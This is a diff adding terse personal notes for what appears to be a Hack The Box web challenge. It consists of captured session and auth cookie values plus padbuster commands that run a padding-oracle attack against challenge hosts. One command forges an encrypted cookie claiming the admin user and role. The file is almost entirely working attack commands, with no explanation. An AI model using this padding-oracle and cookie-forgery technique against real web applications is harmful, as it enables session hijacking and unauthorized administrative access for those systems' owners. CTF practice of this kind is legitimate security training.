@@ -1,0 +1,19 @@
+__auc	03ac39c616d0cd2131592867766
+iknowmag1k	yQrT4REPkZZYyBAfPBaHgvyZ6Hk5RAwZC8/ixjwA1hy+cEK/xl8Hrw==
+PHPSESSID	31ot76mu6il381sqs2c618df32
+
+
+padbuster http://docker.hackthebox.eu:33142/profile.php yQrT4REPkZZYyBAfPBaHgvyZ6Hk5RAwZC8/ixjwA1hy+cEK/xl8Hrw== 8 -cookies "PHPSESSID=31ot76mu6il381sqs2c618df32; iknowmag1k=yQrT4REPkZZYyBAfPBaHgvyZ6Hk5RAwZC8/ixjwA1hy+cEK/xl8Hrw=="
+
+
+
+padbuster http://docker.hackthebox.eu:33226/profile.php %2Fvf1N85kO8rZLwgvzjgbWESjHuborIJlQGBsqu%2Bhu%2Fjf2yiJHQKl2g%3D%3D --cookies "PHPSESSID=31ot76mu6il381sqs2c618df32; iknowmag1k=%2Fvf1N85kO8rZLwgvzjgbWESjHuborIJlQGBsqu%2Bhu%2Fjf2yiJHQKl2g%3D%3D" 8 --encoding=0 --plaintext "{"user":"admin","role":"admin"}"
+
+
+padbuster http://docker.hackthebox.eu:33226/profile.php %2Fvf1N85kO8rZLwgvzjgbWESjHuborIJlQGBsqu%2Bhu%2Fjf2yiJHQKl2g%3D%3D --cookies "PHPSESSID=31ot76mu6il381sqs2c618df32; iknowmag1k=%2Fvf1N85kO8rZLwgvzjgbWESjHuborIJlQGBsqu%2Bhu%2Fjf2yiJHQKl2g%3D%3D" 8 --encoding=0 
+
+
+ __auc=03ac39c616d0cd2131592867766; PHPSESSID=31ot76mu6il381sqs2c618df32; iknowmag1k=nbGETODCL7LmtjDB%2B92wVSFt3O9KxpOCDtrlcWg1imFkddeAHxBSzw%3D%3
+
+
+padbuster http://docker.hackthebox.eu:33705/profile.php nbGETODCL7LmtjDB%2B92wVSFt3O9KxpOCDtrlcWg1imFkddeAHxBSzw%3D%3 --cookies "PHPSESSID=31ot76mu6il381sqs2c618df32; iknowmag1k=nbGETODCL7LmtjDB%2B92wVSFt3O9KxpOCDtrlcWg1imFkddeAHxBSzw%3D%3" 8 --encoding=0
